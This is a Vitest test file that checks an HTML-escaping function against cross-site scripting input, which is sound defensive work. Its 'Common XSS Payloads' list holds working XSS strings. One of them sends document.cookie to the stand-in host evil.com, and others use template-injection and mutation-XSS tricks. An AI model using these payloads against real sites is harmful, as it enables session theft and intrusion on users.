/**
 * XSS Prevention Tests
 *
 * These tests verify that user-provided content is properly sanitized
 * to prevent Cross-Site Scripting (XSS) attacks.
 */

import { describe, it, expect } from 'vitest';
import { escapeHtml } from '../../src/component/element';

describe('XSS Prevention', () => {
  describe('escapeHtml', () => {
    it('should escape script tags', () => {
      const malicious = '<script>alert("xss")</script>';
      const escaped = escapeHtml(malicious);
      expect(escaped).not.toContain('<script');
      expect(escaped).not.toContain('</script>');
      expect(escaped).toBe('&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;');
    });

    it('should escape img onerror payloads', () => {
      const malicious = '<img src=x onerror=alert("xss")>';
      const escaped = escapeHtml(malicious);
      expect(escaped).not.toContain('<img');
      // The onerror text remains but is not functional because < and > are escaped
      expect(escaped).toBe('&lt;img src=x onerror=alert(&quot;xss&quot;)&gt;');
    });

    it('should escape attribute injection payloads', () => {
      const malicious = '"><script>alert("xss")</script>';
      const escaped = escapeHtml(malicious);
      expect(escaped).not.toContain('<script');
      expect(escaped).toBe('&quot;&gt;&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;');
    });

    it('should escape javascript: URLs', () => {
      const malicious = 'javascript:alert("xss")';
      const escaped = escapeHtml(malicious);
      // javascript: URLs need to be handled at the protocol level
      // escapeHtml at least escapes the quotes
      expect(escaped).toBe('javascript:alert(&quot;xss&quot;)');
    });

    it('should escape SVG onload payloads', () => {
      const malicious = '<svg onload=alert("xss")>';
      const escaped = escapeHtml(malicious);
      expect(escaped).not.toContain('<svg');
      // The onload text remains but is not functional because < and > are escaped
      expect(escaped).toBe('&lt;svg onload=alert(&quot;xss&quot;)&gt;');
    });

    it('should escape HTML entities', () => {
      const malicious = '&lt;script&gt;';
      const escaped = escapeHtml(malicious);
      // Should double-escape to prevent entity decoding attacks
      expect(escaped).toBe('&amp;lt;script&amp;gt;');
    });

    it('should escape single quotes', () => {
      const malicious = "onclick='alert(1)'";
      const escaped = escapeHtml(malicious);
      expect(escaped).not.toContain("'alert");
      expect(escaped).toBe('onclick=&#039;alert(1)&#039;');
    });

    it('should handle empty strings', () => {
      expect(escapeHtml('')).toBe('');
    });

    it('should preserve safe text', () => {
      const safe = 'Hello, World! 123';
      expect(escapeHtml(safe)).toBe(safe);
    });

    it('should preserve unicode characters', () => {
      const unicode = '你好世界 🌍 مرحبا';
      expect(escapeHtml(unicode)).toBe(unicode);
    });

    it('should preserve newlines and whitespace', () => {
      const text = 'Line 1\nLine 2\tTabbed';
      expect(escapeHtml(text)).toBe(text);
    });

    it('should handle mixed content', () => {
      const mixed = 'Hello <b>World</b> & "Friends"';
      const escaped = escapeHtml(mixed);
      expect(escaped).toBe('Hello &lt;b&gt;World&lt;/b&gt; &amp; &quot;Friends&quot;');
    });
  });

  describe('Common XSS Payloads', () => {
    const xssPayloads = [
      '<script>alert("xss")</script>',
      '<img src=x onerror=alert("xss")>',
      '"><script>alert("xss")</script>',
      '<svg onload=alert("xss")>',
      '<body onload=alert("xss")>',
      '<iframe src="javascript:alert(\'xss\')">',
      '<input onfocus=alert("xss") autofocus>',
      '<marquee onstart=alert("xss")>',
      '<video><source onerror=alert("xss")>',
      '<details open ontoggle=alert("xss")>',
      '"><img src=x onerror=alert("xss")>',
      "'-alert(1)-'",
      '<script>document.location="http://evil.com/steal?c="+document.cookie</script>',
      '<div style="background:url(javascript:alert(\'xss\'))">',
      '<object data="javascript:alert(\'xss\')">',
      '<embed src="javascript:alert(\'xss\')">',
      '<a href="javascript:alert(\'xss\')">click</a>',
      '{{constructor.constructor("alert(1)")()}}',
      '${alert(1)}',
      '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>',
    ];

    for (const payload of xssPayloads) {
      it(`should neutralize: ${payload.substring(0, 40)}...`, () => {
        const escaped = escapeHtml(payload);
        // Verify that HTML tag characters are escaped
        // When < and > are escaped, the browser cannot interpret the content as HTML
        expect(escaped).not.toMatch(/<[a-zA-Z]/);  // No unescaped opening tags
        // Event handlers like "onerror" remain as text but are harmless
        // because the surrounding HTML tags are escaped
      });
    }
  });

  describe('Edge Cases', () => {
    it('should handle very long strings', () => {
      const longPayload = '<script>'.repeat(10000);
      const escaped = escapeHtml(longPayload);
      expect(escaped).not.toContain('<script');
    });

    it('should handle null-byte injection attempts', () => {
      const payload = '<script\x00>alert(1)</script>';
      const escaped = escapeHtml(payload);
      expect(escaped).not.toMatch(/<script/);
    });

    it('should handle various quote styles', () => {
      const payload = `<img src="x" onerror='alert(1)' onload=\`alert(2)\`>`;
      const escaped = escapeHtml(payload);
      expect(escaped).not.toContain('<img');
    });

    it('should handle HTML comments', () => {
      const payload = '<!--<script>alert(1)</script>-->';
      const escaped = escapeHtml(payload);
      expect(escaped).not.toContain('<!--');
      expect(escaped).not.toContain('-->');
    });

    it('should handle CDATA sections', () => {
      const payload = '<![CDATA[<script>alert(1)</script>]]>';
      const escaped = escapeHtml(payload);
      expect(escaped).not.toContain('<![CDATA[');
    });
  });
});
